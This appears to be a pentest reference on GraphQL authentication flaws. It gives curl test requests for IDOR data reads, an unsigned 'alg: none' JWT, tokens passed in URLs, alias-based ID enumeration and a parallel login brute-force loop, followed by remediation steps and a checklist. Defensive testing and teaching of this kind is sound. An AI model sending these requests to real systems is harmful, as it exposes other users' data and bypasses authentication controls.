# GraphQL Authentication Security Reference

> **Part of the CyberViser / Hancock Pentest Knowledge Base**  
> This document provides reference techniques for authorized GraphQL security testing.

---

## Overview

GraphQL APIs present unique attack surfaces compared to REST APIs. This reference covers common authentication and authorization flaws, testing techniques, and remediation strategies.

**Scope:** Authorized, zero-impact testing only.  
**Target Example:** GraphQL endpoints (e.g., `/api/graphql`)  
**Auth Mechanisms:** Bearer JWT + session cookies (SameSite=Strict, HttpOnly)

---

## Common GraphQL Authentication Flaws

### 1. Missing Authorization on Queries (BOLA / IDOR)

**Description:** GraphQL often protects the root query but forgets per-field or per-resolver authorization checks.

**Test Technique:**
```bash
curl -s -X POST https://target.example/api/graphql \
  -H "Authorization: Bearer <valid-token>" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ viewer { id } otherUser(id: \"usr_123456\") { email } }"}'
```

**Vulnerable Response:**
```json
{
  "data": {
    "viewer": { "id": "usr_abc" },
    "otherUser": { "email": "victim@company.com" }
  }
}
```

**Severity:** HIGH  
**Impact:** Any authenticated user can read another user's data by guessing numeric/sequential IDs. Classic IDOR in GraphQL.

---

### 2. JWT Algorithm Confusion / None Attack

**Description:** Weak JWT implementations may accept tokens with `alg: none` or allow algorithm confusion attacks.

**Test Technique:**
```bash
# Modify token: change alg to "none", remove signature
curl -s -X POST https://target.example/api/graphql \
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c3JfMTIzIn0." \
  -d '{"query":"{ viewer { email } }"}'
```

**Protected Response:**
```json
{ "errors": [{ "message": "Invalid token signature" }] }
```

**Check:** Server should reject `none` algorithm and weak signature algorithms.

---

### 3. Token in URL / GET Requests

**Description:** GraphQL over GET may be enabled for caching, which can leak tokens in server logs and browser history.

**Test Technique:**
```bash
curl -s "https://target.example/api/graphql?query={viewer{email}}&token=<token>"
```

**Protected Response:** `400 Bad Request` with "POST only"

**Check:** Ensure sensitive operations require POST to prevent token logging in proxies.

---

### 4. Broken Object-Level Auth via Fragments/Aliases

**Description:** Using GraphQL fragments or aliases to bypass authorization checks on specific fields.

**Test Technique:**
```bash
curl -s -X POST https://target.example/api/graphql \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"query":"fragment UserFrag on User { email } { u1: user(id:\"1\") { ...UserFrag } u2: user(id:\"999999\") { ...UserFrag } }"}'
```

**Severity:** MEDIUM  
**Impact:** Partial data leak via field aliasing on enumerable IDs.

---

### 5. Rate-Limit Bypass on Login Mutation

**Description:** Testing whether login mutations are properly rate-limited to prevent brute-force attacks.

**Test Technique:**
```bash
for i in {1..50}; do
  curl -s -X POST https://target.example/api/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { login(email:\"test+'$i'@evil.com\", pass:\"wrong\") { token } }"}' &
done
```

**Protected Response:** `429 Too Many Requests` after ~8 attempts (IP + fingerprint based)

**Check:** Strong rate limiting should trigger after a reasonable number of attempts.

---

## Remediation Strategies

### Immediate Actions

1. **Add @auth directives** (Apollo/Hasura/AppSync):
   ```graphql
   type Query {
     user(id: ID!): User @auth(requires: [OWNER, ADMIN])
   }
   ```

2. **Use global auth context + field resolvers** that always check ownership:
   ```typescript
   // lib/auth.ts
   const isOwner = (context, requiredId) => context.user.id === requiredId;
   ```

3. **Replace numeric IDs** with opaque cursors / UUIDs + rate-limited pagination.

### Long-Term Improvements

4. **Enable persisted queries** + query allow-list in AppSync/Apollo.

5. **Log & alert** on cross-user queries in monitoring systems (CloudWatch, Datadog, etc.).

6. **Implement query depth limiting** to prevent nested query attacks.

7. **Use query complexity analysis** to prevent resource exhaustion.

---

## Security Checklist

| Check | Status |
|-------|--------|
| Object-level authorization on all queries | ⬜ |
| JWT algorithm validation (reject `none`) | ⬜ |
| POST-only for sensitive operations | ⬜ |
| Rate limiting on authentication mutations | ⬜ |
| Introspection disabled in production | ⬜ |
| Query depth limiting | ⬜ |
| Field-level authorization | ⬜ |
| Opaque IDs (UUIDs vs sequential) | ⬜ |

---

## Related Resources

- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL Security Best Practices](https://www.apollographql.com/docs/apollo-server/security/authentication/)
- [HackTricks - GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)

---

## Disclaimer

⚠️ **FOR AUTHORIZED SECURITY TESTING ONLY.**  
Use these techniques only on systems you own or have explicit written permission to test. Unauthorized use is illegal under the CFAA and equivalent laws.

---

© 2026 CyberViser — Part of the Hancock AI Security Platform
